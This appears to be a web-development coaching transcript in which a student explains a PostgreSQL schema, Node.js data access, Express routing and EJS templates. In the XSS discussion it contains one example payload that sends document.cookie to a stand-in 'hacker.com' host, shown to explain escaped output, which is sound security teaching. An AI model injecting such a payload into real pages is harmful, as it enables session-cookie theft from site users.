@@ -1,0 +1,395 @@
+W02 COACHING SESSION: DATABASE RETRIEVAL
+Student: Tracy
+Topics: Relational Database Design and Structure; Server-Side Data Access Logic; Express Server Logic and Routing; EJS Templates
+
+NOTE
+This transcript compiles the coaching discussion and preserves the student's explanations and code examples. Some earlier coach feedback is summarized faithfully from the session record rather than reproduced word-for-word.
+
+======================================================================
+WELCOME AND SESSION INTRODUCTION
+======================================================================
+
+COACH:
+Welcome! Just to be clear from the start, this is a coaching session, not a test. It is perfectly okay—and even encouraged—to say "I don't know" or "I made a mistake." That's the fastest way we'll learn today.
+
+STUDENT:
+Tracy.
+
+COACH:
+Thanks, Tracy. We'll work through four topics: relational database design and structure, server-side data access logic, Express server logic and routing, and EJS templates. We'll discuss your project code and the reasoning behind your decisions, one question at a time.
+
+======================================================================
+TOPIC 1: RELATIONAL DATABASE DESIGN AND STRUCTURE
+======================================================================
+
+STUDENT:
+My database has four main tables:
+
+1. organization: stores nonprofit partner information. It has organization_id as the primary key, and columns such as name, description, contact_email, and logo_filename. One organization can have many projects.
+
+2. project: stores service projects. It has project_id as the primary key and organization_id as a foreign key. Other columns include name, description, project_date, and location. Each project belongs to one organization. This avoids repeating organization details in every project row.
+
+3. category: stores category labels. It has category_id as the primary key and a name column with a UNIQUE constraint. It is an independent entity.
+
+4. project_category: a junction table connecting projects and categories. It has a composite primary key made from project_id and category_id, and foreign keys to project and category. This supports a many-to-many relationship because a project can have multiple categories and a category can belong to multiple projects.
+
+STUDENT CODE:
+CREATE TABLE project_category (
+    project_id  INTEGER NOT NULL REFERENCES project(project_id)   ON DELETE CASCADE,
+    category_id INTEGER NOT NULL REFERENCES category(category_id) ON DELETE CASCADE,
+    PRIMARY KEY (project_id, category_id)
+);
+
+STUDENT EXPLANATION:
+The composite primary key enforces uniqueness and prevents duplicate project/category associations. There is no wasted surrogate ID because this table represents a relationship. The composite key also provides a useful index for project-specific category lookups. This is a standard junction-table pattern. A separate ID could make sense if the relationship had its own attributes, such as assigned_date or assigned_by.
+
+COACH FEEDBACK:
+Correct. The composite primary key prevents the same category from being linked to the same project more than once. A separate ID may be useful if another table needs to reference a particular relationship row or if the relationship itself has additional data.
+
+COACH QUESTION:
+How do you retrieve projects together with the name of the organization they belong to?
+
+STUDENT CODE:
+SELECT
+    p.name AS project_name,
+    o.name AS organization_name,
+    p.project_date
+FROM
+    project p
+JOIN
+    organization o ON p.organization_id = o.organization_id;
+
+STUDENT EXPLANATION:
+This query retrieves the project name, organization name, and project date. The aliases p and o make the query shorter and easier to read. The JOIN connects each project to its organization through organization_id. It is an INNER JOIN.
+
+COACH QUESTION:
+Why did you choose INNER JOIN instead of LEFT JOIN?
+
+STUDENT:
+The schema uses organization_id INTEGER NOT NULL REFERENCES organization(organization_id) in the project table, so every project has a valid organization. INNER JOIN and LEFT JOIN produce the same result when starting from project and joining organization.
+
+INNER JOIN semantics exactly indicate that both sides must match. Performance differences are minor and depend on the query optimizer.
+
+LEFT JOIN is useful when I want to list all organizations, even those without projects:
+
+STUDENT CODE:
+SELECT o.name AS organization_name, p.name AS project_name
+FROM organization o
+LEFT JOIN project p ON o.organization_id = p.organization_id;
+
+It can also be useful for optional categories or uncategorized drafts.
+
+COACH FEEDBACK:
+Good reasoning. Because each project must reference an organization, an INNER JOIN is appropriate for this query. A LEFT JOIN is useful when you want to preserve every row from the left-hand table, including organizations that do not yet have projects. INNER JOIN is not automatically faster; the database optimizer and query structure determine performance.
+
+TOPIC 1 COMPLETED.
+
+======================================================================
+TOPIC 2: SERVER-SIDE DATA ACCESS LOGIC (NODE.JS)
+======================================================================
+
+COACH:
+Let's look at how your Node.js application connects to PostgreSQL and retrieves records.
+
+STUDENT CODE — DATABASE CONNECTION:
+import pg from 'pg';
+import dotenv from 'dotenv';
+dotenv.config();
+
+const { Pool } = pg;
+
+const pool = new Pool({
+    connectionString: process.env.DATABASE_URL,
+    ssl: process.env.NODE_ENV === 'development'
+        ? { rejectUnauthorized: false }
+        : false
+});
+
+STUDENT CODE — MODEL RETRIEVAL FUNCTION:
+import db from '../database/index.js';
+
+const getAllProjects = async () => {
+    const query = 'SELECT project_id, organization_id, name, description, project_date, location FROM project';
+    const result = await db.query(query);
+    return result.rows;
+};
+
+export { getAllProjects };
+
+STUDENT EXPLANATION:
+The model imports the database pool from database/index.js. The function is async because database queries take time. await db.query(query) sends the query and waits for the result. result.rows is an array containing the records returned by PostgreSQL.
+
+COACH FEEDBACK:
+A connection pool allows the application to reuse database connections. Environment variables keep connection details out of the source code. The database module must default-export the pool for the import `import db from '../database/index.js'` to work as written.
+
+COACH QUESTION:
+Why use async/await instead of making the database query synchronous?
+
+STUDENT:
+Node.js uses an event loop and non-blocking I/O. A synchronous query would block the server and prevent it from serving concurrent requests while waiting for the database.
+
+The pg library is asynchronous and returns a Promise, so synchronous use is not suitable. The course standards also prefer async/await and arrow functions.
+
+I think of it like a restaurant: a waiter does not stand idle in the kitchen waiting for one meal to cook. The waiter can serve other customers while the kitchen prepares the order.
+
+COACH FEEDBACK:
+Exactly. await pauses the current async function while the database operation is pending; it does not freeze the entire Node.js event loop. The server can continue handling other work.
+
+COACH QUESTION:
+How would you handle database errors in your retrieval function?
+
+STUDENT CODE:
+import db from '../database/index.js';
+
+const getAllProjects = async () => {
+    try {
+        const query = 'SELECT project_id, organization_id, name, description, project_date, location FROM project';
+        const result = await db.query(query);
+        return result.rows;
+    } catch (error) {
+        // Log the error for the developer to see in the console
+        console.error('Error fetching projects from database:', error.message);
+
+        // Re-throw the error so the route handler knows the query failed
+        throw error;
+    }
+};
+
+export { getAllProjects };
+
+STUDENT EXPLANATION:
+The catch block handles problems such as the database being down, a wrong connection, or a missing table. The route handler can render a friendly error page. Logging helps with debugging on Render. It also prevents sensitive database details from reaching the browser. Re-throwing the error means the failure is not confused with an empty result.
+
+COACH FEEDBACK:
+Good. Logging and re-throwing preserve useful information for debugging and allow the route or error-handling middleware to respond appropriately. A try/catch block alone does not guarantee that the server will avoid an unhandled error; the Express handler or error middleware must also handle the rejected operation.
+
+TOPIC 2 COMPLETED.
+
+======================================================================
+TOPIC 3: EXPRESS SERVER LOGIC AND ROUTING
+======================================================================
+
+COACH:
+Now let's connect your model to your Express routes.
+
+STUDENT CODE:
+app.get('/projects', getProjectsPage);
+
+COACH FEEDBACK:
+This declares a route. It tells Express that when a GET request arrives at /projects, it should run the getProjectsPage handler.
+
+COACH QUESTION:
+Why keep the route declaration separate from the route handler function?
+
+STUDENT:
+Keeping route declarations in server.js makes it act like a readable routing table. For example:
+
+STUDENT CODE:
+app.get('/', getHomePage);
+app.get('/organizations', getOrganizationsPage);
+app.get('/projects', getProjectsPage);
+app.get('/categories', getCategoriesPage);
+
+Named functions improve debugging because stack traces can show a meaningful function name, such as getProjectsPage, rather than an anonymous function.
+
+They also improve reusability because a handler can be used for another endpoint when appropriate. They improve testability because I can import a handler and pass request and response mocks.
+
+This supports separation of concerns and the Single Responsibility Principle. The route declaration maps a URL and HTTP method to a handler, while the handler contains the logic for responding to the request.
+
+COACH FEEDBACK:
+Well explained. Keeping route mapping separate from handler logic makes server.js easier to scan and makes handlers easier to test and maintain.
+
+COACH QUESTION:
+Can you show the handler function that retrieves the projects and renders the page?
+
+STUDENT CODE:
+const getProjectsPage = async (req, res) => {
+    const title = 'Service Projects';
+    const projects = await getAllProjects();
+    res.render('projects', { title, projects });
+};
+
+STUDENT EXPLANATION:
+This is a named asynchronous arrow function. It receives req and res from Express.
+
+The title variable stores the page title. The await getAllProjects() call retrieves the projects from the model and stores the returned array in projects.
+
+Finally, res.render() tells Express to render the projects template and pass it an object containing title and projects. Those values become available inside the EJS template.
+
+COACH FEEDBACK:
+Correct. The request reaches the route, Express calls the handler, the handler retrieves data from the model, and res.render sends the data to the view engine to create the HTML response.
+
+TOPIC 3 COMPLETED.
+
+======================================================================
+TOPIC 4: EJS TEMPLATES AND RENDERING
+======================================================================
+
+COACH:
+Let's examine how the EJS template displays the project data. EJS has different tags: `<% %>` runs JavaScript without outputting it, while `<%= %>` evaluates an expression and outputs its escaped value. `<%- %>` outputs unescaped content.
+
+STUDENT CODE:
+<section class="card-grid">
+    <% projects.forEach((project) => { %>
+        <article class="card">
+            <div class="card-body">
+                <h2><%= project.name %></h2>
+                <p><%= project.description %></p>
+                <p><strong>Date:</strong> <%= project.project_date.toLocaleDateString() %></p>
+                <p><strong>Location:</strong> <%= project.location %></p>
+            </div>
+        </article>
+    <% }); %>
+</section>
+
+STUDENT EXPLANATION:
+`<% ... %>` executes JavaScript without displaying its result. `projects.forEach` loops through the projects array passed by getProjectsPage.
+
+`<%= ... %>` evaluates a value and displays it as escaped output. Escaping helps prevent cross-site scripting (XSS).
+
+The date is formatted using toLocaleDateString(). Depending on the PostgreSQL column type and the pg type parser, a date or timestamp may be returned as a JavaScript Date object; the code should be checked against the actual returned value.
+
+COACH FEEDBACK:
+Good explanation. One important clarification: EJS is a server-side templating engine. Express and EJS generate the HTML on the server before sending the response to the browser, even if an assignment section informally refers to displaying or rendering content on the client side.
+
+COACH QUESTION:
+Why is it important to use `<%=` instead of `<%-` when displaying project information such as names and descriptions from your database?
+
+STUDENT:
+1. `<%=` (Escaped Output - Safe)
+
+The `<%=` tag tells EJS to escape any HTML characters before putting them on the page.
+
+If a project name in your database was accidentally (or maliciously) saved as:
+`<script>alert("Hacked!");</script>`
+
+Using `<%= project.name %>` will convert the angle brackets into safe HTML entities. The browser will display the literal text on the screen instead of running the code:
+`&lt;script&gt;alert("Hacked!");&lt;/script&gt;`
+
+2. `<%-` (Unescaped/Raw Output - Dangerous)
+
+The `<%-` tag tells EJS to render the string exactly as it is.
+
+If you used `<%- project.name %>`, the browser would see `<script>alert("Hacked!");</script>` and immediately execute the JavaScript.
+
+Why would a database have malicious code?
+
+Even though I wrote the seed data in setup.sql, in a real application, this data comes from users. Imagine if a user filled out a form to create a new project, and for the description they pasted:
+`<img src="x" onerror="fetch('https://hacker.com/steal?cookie=' + document.cookie)">`
+
+If you render that with `<%-`, the hacker just stole the admin's session cookie. By using `<%=`, the browser just sees a broken image and ignores the script.
+
+The Exception in Your Project
+
+The only time you use `<%-` in your project is for the partials:
+
+STUDENT CODE:
+<%- include('partials/header') %>
+<%- include('partials/footer') %>
+
+You use the raw tag here because you want the HTML from those files to render as actual HTML, not as visible text on the page. Because you wrote the partials yourself, you know they are trusted and safe.
+
+The Golden Rule
+
+As the W02 assignment standards explicitly state:
+
+"`<%= %>` rather than `<%- %>` should be used for all EJS data except the header and footer partials."
+
+Default to `<%=` for all database data. Only use `<%-` for trusted template files.
+
+COACH FEEDBACK:
+Excellent explanation. You correctly described how escaped output helps prevent injected scripts from executing, why unescaped output can create an XSS vulnerability, and why trusted template partials are a legitimate use of raw output. In general, raw output should only be used for trusted or properly sanitized HTML.
+
+COACH QUESTION — FINAL DATA-FLOW QUESTION:
+How does the `projects` variable travel from the database into the EJS template, and how does the template use it to display the projects?
+
+STUDENT:
+Step 1: The Database
+
+The raw data lives in your PostgreSQL `project` table. It holds the rows (name, description, date, location) but has no idea your Node.js app exists.
+
+Step 2: The Model (`src/models/projects.js`)
+
+When your server needs the projects, it calls the `getAllProjects()` function. This function runs the SQL query and uses `pg` to fetch the data.
+
+STUDENT CODE:
+const result = await db.query('SELECT * FROM project');
+return result.rows;
+
+`result.rows` is an array of objects. It looks like this:
+
+STUDENT CODE:
+[
+  { project_id: 1, name: "Spring Tree Planting", description: "...", ... },
+  { project_id: 2, name: "Homework Help Hotline", description: "...", ... }
+]
+
+Step 3: The Controller (`server.js`)
+
+The `getProjectsPage` route handler receives that array from the model and stores it in a local variable called `projects`.
+
+STUDENT CODE:
+const projects = await getAllProjects();
+
+Then, it uses `res.render()` to hand this array over to the EJS engine. The second argument is an object containing all the variables you want to make available inside the template:
+
+STUDENT CODE:
+res.render('projects', { title, projects });
+
+Step 4: The View (`views/projects.ejs`)
+
+Express takes that `{ title, projects }` object and uses it to render the `projects.ejs` file. Inside the template, `projects` is now a variable you can access.
+
+The template uses `<% %>` tags to run a loop over the array:
+
+STUDENT CODE:
+<% projects.forEach((project) => { %>
+
+For every object in the array, it creates a new card. Then, it uses `<%= %>` tags to extract the specific properties from the current `project` object and print them to the screen:
+
+STUDENT CODE:
+<h2><%= project.name %></h2>
+<p><%= project.description %></p>
+
+Note: In W03, when you add categories to the projects page, you will use a JOIN query in the model, which will return an array of objects where some properties are themselves nested arrays of category objects. But the flow from `server.js` to `projects.ejs` remains exactly the same!
+
+COACH FEEDBACK:
+Excellent, Tracy. You traced the data through all four layers:
+1. PostgreSQL stores the project rows.
+2. The model queries PostgreSQL and returns result.rows as an array of objects.
+3. The Express route handler awaits the model function and passes the array to res.render().
+4. EJS receives the projects variable, loops through it, and outputs each project's details into the HTML.
+
+Your explanation correctly identifies the responsibility of each layer and how data moves through the application. The same route-to-template flow will continue to work when you add category data through JOIN queries.
+
+TOPIC 4 COMPLETED.
+
+======================================================================
+SESSION SUMMARY
+======================================================================
+
+All four coaching topics were discussed:
+
+1. Relational Database Design and Structure
+   - Tables, primary keys, foreign keys, one-to-many and many-to-many relationships.
+   - Junction tables and composite primary keys.
+   - INNER JOIN and LEFT JOIN.
+
+2. Server-Side Data Access Logic
+   - PostgreSQL connection pooling and environment variables.
+   - Async/await and non-blocking database access.
+   - Returning result.rows.
+   - Error logging, re-throwing errors, and handling failures in Express.
+
+3. Express Server Logic and Routing
+   - Mapping HTTP methods and paths to named handlers.
+   - Separating route declarations from handler logic.
+   - Retrieving model data and passing it to res.render().
+
+4. EJS Templates and Rendering
+   - EJS loop and output tags.
+   - Escaped output with `<%= %>` and unescaped output with `<%- %>`.
+   - XSS prevention and trusted partials.
+   - The complete flow from PostgreSQL through the model and route handler into the EJS view.
+
+END OF TRANSCRIPT
